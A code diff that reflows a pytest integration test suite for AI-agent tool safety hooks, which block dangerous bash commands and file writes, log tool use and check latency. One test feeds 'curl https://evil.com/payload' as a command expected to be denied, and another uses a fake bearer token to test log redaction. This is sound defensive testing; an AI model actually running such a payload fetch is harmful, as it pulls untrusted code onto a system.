@@ -33,21 +33,14 @@ class TestSafetyHooksIntegration:
 
         for cmd in dangerous_commands:
             input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
-            result = await validate_bash_command(
-                input_data, "test-123", None, config=config
-            )
+            result = await validate_bash_command(input_data, "test-123", None, config=config)
 
             assert "hookSpecificOutput" in result, f"Command '{cmd}' should be blocked"
             hook_output = result["hookSpecificOutput"]
-            assert hook_output["permissionDecision"] == "deny", (
-                f"Command '{cmd}' should be denied"
-            )
+            assert hook_output["permissionDecision"] == "deny", f"Command '{cmd}' should be denied"
             assert hook_output["hookEventName"] == "PreToolUse"
             # blockedPattern should be in the output
-            assert (
-                "blockedPattern" in hook_output
-                or "permissionDecisionReason" in hook_output
-            )
+            assert "blockedPattern" in hook_output or "permissionDecisionReason" in hook_output
 
     @pytest.mark.asyncio
     async def test_bash_command_blocking_fork_bombs_and_system_commands(self) -> None:
@@ -63,9 +56,7 @@ class TestSafetyHooksIntegration:
 
         for cmd in dangerous_commands:
             input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
-            result = await validate_bash_command(
-                input_data, "test-123", None, config=config
-            )
+            result = await validate_bash_command(input_data, "test-123", None, config=config)
 
             assert "hookSpecificOutput" in result, f"Command '{cmd}' should be blocked"
             assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
@@ -85,9 +76,7 @@ class TestSafetyHooksIntegration:
 
         for cmd in safe_commands:
             input_data = {"tool_name": "Bash", "tool_input": {"command": cmd}}
-            result = await validate_bash_command(
-                input_data, "test-123", None, config=config
-            )
+            result = await validate_bash_command(input_data, "test-123", None, config=config)
 
             assert result == {}, f"Safe command '{cmd}' should be allowed"
 
@@ -104,9 +93,7 @@ class TestSafetyHooksIntegration:
             "tool_name": "Bash",
             "tool_input": {"command": "curl https://evil.com/payload"},
         }
-        result = await validate_bash_command(
-            input_data, "test-123", None, config=config
-        )
+        result = await validate_bash_command(input_data, "test-123", None, config=config)
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
 
         # Should be allowed
@@ -114,9 +101,7 @@ class TestSafetyHooksIntegration:
             "tool_name": "Bash",
             "tool_input": {"command": "curl https://google.com"},
         }
-        result = await validate_bash_command(
-            input_data, "test-123", None, config=config
-        )
+        result = await validate_bash_command(input_data, "test-123", None, config=config)
         assert result == {}
 
     @pytest.mark.asyncio
@@ -131,9 +116,7 @@ class TestSafetyHooksIntegration:
             "tool_name": "Bash",
             "tool_input": {"command": "rm -rf node_modules"},
         }
-        result = await validate_bash_command(
-            input_data, "test-123", None, config=config
-        )
+        result = await validate_bash_command(input_data, "test-123", None, config=config)
         assert result == {}
 
     @pytest.mark.asyncio
@@ -156,17 +139,13 @@ class TestSafetyHooksIntegration:
                 "tool_name": "Write",
                 "tool_input": {"file_path": path, "content": "secret data"},
             }
-            result = await validate_file_write(
-                input_data, "test-123", None, config=config
-            )
+            result = await validate_file_write(input_data, "test-123", None, config=config)
 
             assert "hookSpecificOutput" in result, (
                 f"Path '{path}' should be blocked (got: {result})"
             )
             hook_output = result["hookSpecificOutput"]
-            assert hook_output["permissionDecision"] == "deny", (
-                f"Path '{path}' should be denied"
-            )
+            assert hook_output["permissionDecision"] == "deny", f"Path '{path}' should be denied"
 
     @pytest.mark.asyncio
     async def test_file_write_allows_safe_paths(self) -> None:
@@ -185,9 +164,7 @@ class TestSafetyHooksIntegration:
                 "tool_name": "Write",
                 "tool_input": {"file_path": path, "content": "safe data"},
             }
-            result = await validate_file_write(
-                input_data, "test-123", None, config=config
-            )
+            result = await validate_file_write(input_data, "test-123", None, config=config)
 
             assert result == {}, f"Safe path '{path}' should be allowed"
 
@@ -205,9 +182,7 @@ class TestSafetyHooksIntegration:
                 "tool_name": "Write",
                 "tool_input": {"file_path": path, "content": "safe example"},
             }
-            result = await validate_file_write(
-                input_data, "test-123", None, config=config
-            )
+            result = await validate_file_write(input_data, "test-123", None, config=config)
             assert result == {}
 
     @pytest.mark.asyncio
@@ -271,9 +246,7 @@ class TestLoggingHooksIntegration:
                 "status": "success",
             }
 
-            result = await log_tool_execution(
-                input_data, "test-456", None, config=config
-            )
+            result = await log_tool_execution(input_data, "test-456", None, config=config)
 
             # Should return empty dict (no modification to flow)
             assert result == {}
@@ -299,9 +272,7 @@ class TestLoggingHooksIntegration:
             input_data = {
                 "tool_name": "Bash",
                 "tool_input": {
-                    "command": (
-                        "curl -H 'Authorization: Bearer sk-1234567890abcdefghijklmnop'"
-                    )
+                    "command": ("curl -H 'Authorization: Bearer sk-1234567890abcdefghijklmnop'")
                 },
                 "output": "success",
                 "status": "success",
@@ -405,9 +376,7 @@ class TestLoggingHooksIntegration:
         assert write_metrics.call_count == 3
 
     @pytest.mark.asyncio
-    async def test_logging_can_be_disabled(
-        self, caplog: pytest.LogCaptureFixture
-    ) -> None:
+    async def test_logging_can_be_disabled(self, caplog: pytest.LogCaptureFixture) -> None:
         """Test that logging can be disabled via config."""
         config = LoggingConfig(enabled=False)
 
@@ -419,9 +388,7 @@ class TestLoggingHooksIntegration:
                 "status": "success",
             }
 
-            result = await log_tool_execution(
-                input_data, "test-123", None, config=config
-            )
+            result = await log_tool_execution(input_data, "test-123", None, config=config)
             assert result == {}
 
             # Should not create any log entries
@@ -433,9 +400,7 @@ class TestCombinedHooksIntegration:
     """Integration tests for combining safety and logging hooks."""
 
     @pytest.mark.asyncio
-    async def test_safety_blocks_before_logging(
-        self, caplog: pytest.LogCaptureFixture
-    ) -> None:
+    async def test_safety_blocks_before_logging(self, caplog: pytest.LogCaptureFixture) -> None:
         """Test that safety hook blocks before logging hook runs.
 
         When a command is blocked by safety hooks, the tool never executes,
@@ -466,9 +431,7 @@ class TestCombinedHooksIntegration:
     ) -> None:
         """Test that when safety allows, logging can record the execution."""
         safety_config = SafetyConfig(bash_validation_enabled=True)
-        logging_config = LoggingConfig(
-            enabled=True, output_destination="maverick.hooks.logging"
-        )
+        logging_config = LoggingConfig(enabled=True, output_destination="maverick.hooks.logging")
 
         # Safe command should pass safety
         safety_input = {"tool_name": "Bash", "tool_input": {"command": "ls -la"}}
@@ -494,14 +457,10 @@ class TestCombinedHooksIntegration:
             assert "Tool execution: Bash" in caplog.text
 
     @pytest.mark.asyncio
-    async def test_combined_hooks_workflow(
-        self, caplog: pytest.LogCaptureFixture
-    ) -> None:
+    async def test_combined_hooks_workflow(self, caplog: pytest.LogCaptureFixture) -> None:
         """Test a complete workflow with safety, logging, and metrics."""
         safety_config = SafetyConfig(bash_validation_enabled=True)
-        logging_config = LoggingConfig(
-            enabled=True, output_destination="maverick.hooks.logging"
-        )
+        logging_config = LoggingConfig(enabled=True, output_destination="maverick.hooks.logging")
         collector = MetricsCollector()
 
         commands = [
@@ -543,9 +502,9 @@ class TestCombinedHooksIntegration:
                     )
                     successful_executions += 1
                 else:
-                    assert "permissionDecision" in safety_result.get(
-                        "hookSpecificOutput", {}
-                    ), f"Command '{cmd}' should be blocked"
+                    assert "permissionDecision" in safety_result.get("hookSpecificOutput", {}), (
+                        f"Command '{cmd}' should be blocked"
+                    )
 
         # Verify metrics only count successful (allowed) executions
         metrics = await collector.get_metrics("Bash")
@@ -574,18 +533,14 @@ class TestFailClosedBehavior:
             "tool_input": {},  # No command field
         }
 
-        result = await validate_bash_command(
-            input_data, "test-123", None, config=config
-        )
+        result = await validate_bash_command(input_data, "test-123", None, config=config)
 
         # Should be denied due to missing command (fail-closed)
         assert "hookSpecificOutput" in result
         assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
         assert (
-            "command"
-            in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
-            or "missing"
-            in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
+            "command" in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
+            or "missing" in result["hookSpecificOutput"]["permissionDecisionReason"].lower()
         )
 
     @pytest.mark.asyncio
@@ -675,9 +630,7 @@ class TestHookPerformance:
             await validate_bash_command(input_data, "test-123", None, config=config)
             duration_ms = (time.perf_counter() - start) * 1000
 
-            assert duration_ms < 10.0, (
-                f"Hook took {duration_ms:.2f}ms (> 10ms) for command: {cmd}"
-            )
+            assert duration_ms < 10.0, f"Hook took {duration_ms:.2f}ms (> 10ms) for command: {cmd}"
 
     @pytest.mark.asyncio
     async def test_file_write_hook_performance_under_10ms(self) -> None:
@@ -701,9 +654,7 @@ class TestHookPerformance:
             await validate_file_write(input_data, "test-123", None, config=config)
             duration_ms = (time.perf_counter() - start) * 1000
 
-            assert duration_ms < 10.0, (
-                f"Hook took {duration_ms:.2f}ms (> 10ms) for path: {path}"
-            )
+            assert duration_ms < 10.0, f"Hook took {duration_ms:.2f}ms (> 10ms) for path: {path}"
 
     @pytest.mark.asyncio
     async def test_logging_hook_performance_under_10ms(self) -> None:
@@ -723,9 +674,7 @@ class TestHookPerformance:
             await log_tool_execution(input_data, f"test-{i}", None, config=config)
             duration_ms = (time.perf_counter() - start) * 1000
 
-            assert duration_ms < 10.0, (
-                f"Hook took {duration_ms:.2f}ms (> 10ms) on iteration {i}"
-            )
+            assert duration_ms < 10.0, f"Hook took {duration_ms:.2f}ms (> 10ms) on iteration {i}"
 
     @pytest.mark.asyncio
     async def test_metrics_collection_performance_under_10ms(self) -> None:
@@ -746,9 +695,7 @@ class TestHookPerformance:
             )
             duration_ms = (time.perf_counter() - start) * 1000
 
-            assert duration_ms < 10.0, (
-                f"Hook took {duration_ms:.2f}ms (> 10ms) on iteration {i}"
-            )
+            assert duration_ms < 10.0, f"Hook took {duration_ms:.2f}ms (> 10ms) on iteration {i}"
 
     @pytest.mark.asyncio
     async def test_combined_hooks_performance_under_20ms(self) -> None:
@@ -764,9 +711,7 @@ class TestHookPerformance:
 
         # Safety check (PreToolUse)
         safety_input = {"tool_name": "Bash", "tool_input": {"command": command}}
-        await validate_bash_command(
-            safety_input, "test-123", None, config=safety_config
-        )
+        await validate_bash_command(safety_input, "test-123", None, config=safety_config)
 
         # Logging + Metrics (PostToolUse)
         logging_input = {
@@ -811,9 +756,7 @@ class TestHookPerformance:
             }
 
             # Safety check
-            await validate_bash_command(
-                input_data, f"test-{i}", None, config=safety_config
-            )
+            await validate_bash_command(input_data, f"test-{i}", None, config=safety_config)
 
             # Metrics
             await collect_metrics(
@@ -831,9 +774,7 @@ class TestHookPerformance:
 
         # All should complete in reasonable time
         for i, duration in enumerate(durations):
-            assert duration < 20.0, (
-                f"Concurrent execution {i} took {duration:.2f}ms (> 20ms)"
-            )
+            assert duration < 20.0, f"Concurrent execution {i} took {duration:.2f}ms (> 20ms)"
 
         # Average should be well under threshold
         avg_duration = sum(durations) / len(durations)
